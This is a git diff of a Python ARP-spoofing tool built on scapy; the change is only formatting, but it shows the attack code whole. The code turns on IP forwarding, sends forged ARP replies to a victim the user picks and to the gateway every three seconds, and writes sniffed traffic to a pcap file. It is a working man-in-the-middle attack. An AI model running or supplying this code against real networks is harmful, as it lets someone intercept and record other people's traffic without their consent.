@@ -61,7 +61,8 @@ def gateway_info(network_info):
                     {"iface": iface_name, "ip": iface["ip"], "mac": iface["mac"]})
     return gateways
 
-def clients( arp_res, gateway_res):
+
+def clients(arp_res, gateway_res):
     client_list = []
     for gateway in gateway_res:
         for item in arp_res:
@@ -69,27 +70,36 @@ def clients( arp_res, gateway_res):
                 client_list.append(item)
     return client_list
 
+
 def allow_ip_forwarding():
     subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
     subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])
-    
+
+
 def arp_spoofer(target_ip, target_mac, spoof_ip):
     pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(pkt, verbose=False)
 
+
 def send_spoof_packets():
     while True:
-        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
-        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
+        arp_spoofer(gateway_info["ip"],
+                    gateway_info["mac"], node_to_spoof["ip"])
+        arp_spoofer(node_to_spoof["ip"],
+                    node_to_spoof["mac"], gateway_info["ip"])
         time.sleep(3)
-        
+
+
 def packet_sniffer(interface):
-    packets = scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)
-    
+    packets = scapy.sniff(iface=interface, store=False,
+                          prn=process_sniffed_packet)
+
+
 def process_sniffed_packet(packet):
     print("Writing packet to file. Press Ctrl+C to stop")
     scapy.wrpcap("packets.pcap", packet, append=True)
-    
+
+
 def print_arp_res(arp_res):
     print("IP\t\t\tMAC Address\n-----------------------------------------")
     print("\n****************************************************************")
@@ -103,19 +113,20 @@ def print_arp_res(arp_res):
     for id, res in enumerate(arp_res):
         print(f"{id}\t\t{res['ip']}\t\t{res['mac']}")
     while True:
-        try: 
+        try:
             choice = int(input("Please select the Ip Address to poison: "))
             if choice < len(arp_res):
                 return arp_res[choice]
         except:
             print(" Invalid Choice")
 
+
 def get_cmd_arguments():
     ip_range = None
     if len(sys.argv) - 1 > 0 and sys.argv[1] != "-Ip_range":
         print("-ip_range flag not specified")
         return ip_range
-    elif len(sys.argv) -1 > 0 and sys.argv[1] == "-Ip_range":
+    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-Ip_range":
         try:
             print(f"{IPv4Network(sys.argv[2])}")
             ip_range = sys.argv[2]
